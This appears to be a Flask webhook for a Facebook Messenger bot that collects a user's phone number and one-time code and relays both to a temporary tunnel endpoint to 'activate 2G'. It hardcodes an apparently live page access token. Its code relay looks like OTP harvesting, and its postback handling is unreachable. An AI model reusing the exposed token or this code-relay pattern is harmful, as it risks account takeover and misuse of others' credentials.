from flask import Flask, request
import requests

app = Flask(__name__)

PAGE_TOKEN = "EAAMD5SUZAe8YBRXJJUDEJLkodssihglZAqBFjCM04U46WpMbdjnaJP2UYnuI3xZCR09ZBdWzn0tmXOU526qk5wp9nQ4WFwbKqMY2tqjcpjv6PeDYLdvgmdA9zr3UYChHUk5ZBaIz8ZAhlvXOYP64eLFmUnROA8eIYWYMXIbMDooNE3jQFmP3hAChHimVg6ZBU8P9yo0JQZDZD"
VERIFY_TOKEN = "zako70012"

PHONE_API = "https://relation-cap-prince-exhibitions.trycloudflare.com/run"

# 🧠 حفظ حالة المستخدم
users = {}


# =========================
# 📩 إرسال رسالة
# =========================
def send_message(psid, text, buttons=None):
    url = "https://graph.facebook.com/v19.0/me/messages"
    params = {"access_token": PAGE_TOKEN}

    payload = {
        "recipient": {"id": psid},
        "message": {}
    }

    if buttons:
        payload["message"] = {
            "attachment": {
                "type": "template",
                "payload": {
                    "template_type": "button",
                    "text": text,
                    "buttons": buttons
                }
            }
        }
    else:
        payload["message"] = {"text": text}

    requests.post(url, json=payload, params=params)


# =========================
# 🔐 تحقق فيسبوك
# =========================
@app.route("/webhook", methods=["GET"])
def verify():
    if (request.args.get("hub.mode") == "subscribe" and
        request.args.get("hub.verify_token") == VERIFY_TOKEN):
        return request.args.get("hub.challenge"), 200
    return "error", 403


# =========================
# 📩 استقبال الرسائل
# =========================
@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json()

    try:
        entry = data["entry"][0]
        messaging = entry["messaging"][0]

        psid = messaging["sender"]["id"]

        # ❌ تجاهل غير الرسائل
        if "message" not in messaging:
            return "ok", 200

        message = messaging["message"]

        # ❌ منع echo
        if message.get("is_echo"):
            return "ok", 200

        text = message.get("text", "").strip()

        # =========================
        # 🧠 إنشاء حالة المستخدم
        # =========================
        if psid not in users:
            users[psid] = {"step": "phone"}

        user = users[psid]

        # =========================
        # 📱 المرحلة 1: الهاتف
        # =========================
        if user["step"] == "phone":
            user["phone"] = text
            user["step"] = "otp"

            # إرسال OTP للهاتف
            try:
                requests.post(PHONE_API, json={
                    "action": "send_otp",
                    "phone": text
                })
            except:
                pass

            send_message(psid, "📩 تم إرسال رمز OTP، أدخله الآن")

        # =========================
        # 🔐 المرحلة 2: OTP
        # =========================
        elif user["step"] == "otp":
            user["otp"] = text
            user["step"] = "done"

            # إرسال التفعيل للهاتف
            try:
                requests.post(PHONE_API, json={
                    "action": "activate",
                    "phone": user["phone"],
                    "otp": text
                })
            except:
                pass

            # 🔘 زر تفعيل 2G
            buttons = [
                {
                    "type": "postback",
                    "title": "تفعيل 2G",
                    "payload": "ACTIVATE_2G"
                }
            ]

            send_message(psid, "🎉 تم التحقق بنجاح", buttons)

        # =========================
        # 🔘 زر التفعيل
        # =========================
        elif messaging.get("postback"):
            payload = messaging["postback"]["payload"]

            if payload == "ACTIVATE_2G":
                send_message(psid, "⏳ يتم الآن تفعيل 2G...")

    except Exception as e:
        print("ERROR:", e)

    return "ok", 200


# =========================
# 🚀 تشغيل السيرفر
# =========================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)